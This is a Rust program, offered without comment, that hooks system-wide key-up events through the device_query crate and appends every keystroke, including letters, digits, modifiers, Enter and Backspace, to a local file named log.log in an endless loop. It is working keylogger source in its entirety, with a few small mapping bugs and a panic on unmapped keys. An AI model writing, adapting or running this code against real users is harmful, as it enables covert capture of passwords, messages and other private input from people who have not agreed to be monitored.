use std::fs::File;
use std::fs::OpenOptions;
use std::io::Write;
use std::io::ErrorKind;
use device_query::DeviceEvents;
use device_query::Keycode;
pub use device_query::device_events::KeyboardCallback;
use device_query::{DeviceState, keymap};
use device_query::CallbackGuard;


fn main() {
    let device_state = DeviceState::new();
    let _device_state = listen_to(device_state);
    loop {}
}

fn listen_to(device_state:DeviceState) -> CallbackGuard<impl Fn(&Keycode)>{
    device_state.on_key_up(|keys|{
        let mut file = open_file();
        let frmt = format!("{:#?}", keys);
        let keys = keycode_to_string(*keys);
        match keys {
             "0" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "1"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "2"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "3"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "4"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "5"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "6"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "7"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "8"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "9"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "A"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "B"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "C"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "D"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "E"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "G"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "H"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "I"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "J"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "K"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "L"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "M"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "N"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "O"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "P"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Q"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "R"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "S"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "T"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "U"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "V"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "W"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "X"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Y"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Z"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F1"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F2"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F3"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F4"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F5"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F6"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F7"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F8"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F9"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F10"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F11"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "F12"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Escape" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Space" => file.write_all(" ".as_bytes()).expect("Failing to write"),
             "LControl" => file.write_all(" *Control* ".as_bytes()).expect("Failing to write"),
             "RControl" => file.write_all(" *Control* ".as_bytes()).expect("Failing to write"),
             "LShift" => file.write_all(" *Shift* ".as_bytes()).expect("Failing to write"),
             "RShift" => file.write_all(" *Shift* ".as_bytes()).expect("Failing to write"),
             "LAlt" => file.write_all(" *Alt* ".as_bytes()).expect("Failing to write"),
             "RAlt" => file.write_all(" *Alt* ".as_bytes()).expect("Failing to write"),
             "Meta" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Enter" => file.write_all("\n".as_bytes()).expect("Failing to write"),
             "\n" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Up" => file.write_all(" *Up* ".as_bytes()).expect("Failing to write"),
             "Down" => file.write_all(" *Down* ".as_bytes()).expect("Failing to write"),
             "Left" => file.write_all(" *Left* ".as_bytes()).expect("Failing to write"),
             "Right" => file.write_all(" *Right* ".as_bytes()).expect("Failing to write"),
             "Backspace" => file.write_all(" *Backspace* ".as_bytes()).expect("Failing to write"),
             "CapsLock" => file.write_all(" *Caplsock* ".as_bytes()).expect("Failing to write"),
             "Tab" => file.write_all(" *Tab* ".as_bytes()).expect("Failing to write"),
             "Home" => file.write_all(" *Home* ".as_bytes()).expect("Failing to write"),
             "End" => file.write_all(" *End* ".as_bytes()).expect("Failing to write"),
             "PageUp" => file.write_all(" *PageUp* ".as_bytes()).expect("Failing to write"),
             "PageDown" => file.write_all(" *PageDown* ".as_bytes()).expect("Failing to write"),
             "Insert" => file.write_all(" *Insert* ".as_bytes()).expect("Failing to write"),
             "Delete" => file.write_all(" *Delete* ".as_bytes()).expect("Failing to write"),
             "Numpad0" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad1" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad2" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad3" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad4" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad5" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad6" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad7" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad8" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "Numpad9" => file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "NumpadSubtract"=> file.write_all(" - ".as_bytes()).expect("Failing to write"),
             "NumpadAdd"=> file.write_all(" + ".as_bytes()).expect("Failing to write"),
             "NumpadDivide"=> file.write_all(" - ".as_bytes()).expect("Failing to write"),
             "NumpadMultiply"=> file.write_all(" รท ".as_bytes()).expect("Failing to write"),
             "Grave"=> file.write_all(" ` ".as_bytes()).expect("Failing to write"),
             "-"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "="=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "["=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "]"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "BackSlash"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             ";"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "'"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             ","=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "."=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             "/"=> file.write_all(frmt.as_bytes()).expect("Failing to write"),
             _ => todo!(),
            }
    }
    )
}

fn open_file() -> File{
    let file = OpenOptions::new()
        .append(true)
        .open("log.log");
    let file = match file {
        Ok(file) => file,
        Err(error) => match error.kind() {
            ErrorKind::NotFound => match File::create("log.log"){
                Ok(fc) => fc,
                Err(e) => panic!("Error file create {:?}", e),
            },
            other_error => {
                panic!("Error open file {:?}", other_error);
            }
        },
    };
    return file;
}

fn keycode_to_string(keys: Keycode) -> &'static str{
    match keys {
        keymap::Keycode::Key0 => "0",
        keymap::Keycode::Key1 => "1",
        keymap::Keycode::Key2 => "2",
        keymap::Keycode::Key3 => "3",
        keymap::Keycode::Key4 => "4",
        keymap::Keycode::Key5 => "5",
        keymap::Keycode::Key6 => "6",
        keymap::Keycode::Key7 => "7",
        keymap::Keycode::Key8 => "8",
        keymap::Keycode::Key9 => "9",
        keymap::Keycode::A => "A",
        keymap::Keycode::B => "B",
        keymap::Keycode::C => "C",
        keymap::Keycode::D => "D",
        keymap::Keycode::E => "E",
        keymap::Keycode::F => "F",
        keymap::Keycode::G => "G",
        keymap::Keycode::H => "H",
        keymap::Keycode::I => "I",
        keymap::Keycode::J => "J",
        keymap::Keycode::K => "K",
        keymap::Keycode::L => "L",
        keymap::Keycode::M => "M",
        keymap::Keycode::N => "N",
        keymap::Keycode::O => "O",
        keymap::Keycode::P => "P",
        keymap::Keycode::Q => "Q",
        keymap::Keycode::R => "R",
        keymap::Keycode::S => "S",
        keymap::Keycode::T => "T",
        keymap::Keycode::U => "U",
        keymap::Keycode::V => "V",
        keymap::Keycode::W => "W",
        keymap::Keycode::X => "X",
        keymap::Keycode::Y => "Y",
        keymap::Keycode::Z => "Z",
        keymap::Keycode::F1 => "F1",
        keymap::Keycode::F2 => "F2",
        keymap::Keycode::F3 => "F3",
        keymap::Keycode::F4 => "F4",
        keymap::Keycode::F5 => "F5",
        keymap::Keycode::F6 => "F6",
        keymap::Keycode::F7 => "F7",
        keymap::Keycode::F8 => "F8",
        keymap::Keycode::F9 => "F9",
        keymap::Keycode::F10 => "F10",
        keymap::Keycode::F11 => "F11",
        keymap::Keycode::F12 => "F12",
        keymap::Keycode::Escape => "Escape",
        keymap::Keycode::Space => "Space",
        keymap::Keycode::LControl => "LControl",
        keymap::Keycode::RControl => "RControl",
        keymap::Keycode::LShift => "LShift",
        keymap::Keycode::RShift => "RShift",
        keymap::Keycode::LAlt => "LAlt",
        keymap::Keycode::RAlt => "RAlt",
        keymap::Keycode::Meta => "Meta",
        keymap::Keycode::Enter => "Enter",
        keymap::Keycode::Up => "Up",
        keymap::Keycode::Down => "Down",
        keymap::Keycode::Left => "Left",
        keymap::Keycode::Right => "Right",
        keymap::Keycode::Backspace => "Backspace",
        keymap::Keycode::CapsLock => "CapsLock",
        keymap::Keycode::Tab => "Tab",
        keymap::Keycode::Home => "Home",
        keymap::Keycode::End => "End",
        keymap::Keycode::PageUp => "PageUp",
        keymap::Keycode::PageDown => "PageDown",
        keymap::Keycode::Insert => "Insert",
        keymap::Keycode::Delete => "Delete",
        keymap::Keycode::Numpad0 => "Numpad0",
        keymap::Keycode::Numpad1 => "Numpad1",
        keymap::Keycode::Numpad2 => "Numpad2",
        keymap::Keycode::Numpad3 => "Numpad3",
        keymap::Keycode::Numpad4 => "Numpad4",
        keymap::Keycode::Numpad5 => "Numpad5",
        keymap::Keycode::Numpad6 => "Numpad6",
        keymap::Keycode::Numpad7 => "Numpad7",
        keymap::Keycode::Numpad8 => "Numpad8",
        keymap::Keycode::Numpad9 => "Numpad9",
        keymap::Keycode::NumpadSubtract => "NumpadSubtract",
        keymap::Keycode::NumpadAdd => "NumpadAdd",
        keymap::Keycode::NumpadDivide => "NumpadDivide",
        keymap::Keycode::NumpadMultiply => "NumpadMultiply",
        keymap::Keycode::Grave => "Grave",
        keymap::Keycode::Minus => "-",
        keymap::Keycode::Equal => "=",
        keymap::Keycode::LeftBracket => "[",
        keymap::Keycode::RightBracket => "]",
        keymap::Keycode::BackSlash => "BackSlash",
        keymap::Keycode::Semicolon => ";",
        keymap::Keycode::Apostrophe => "'",
        keymap::Keycode::Comma => ",",
        keymap::Keycode::Dot => ".",
        keymap::Keycode::Slash => "/",
    }
}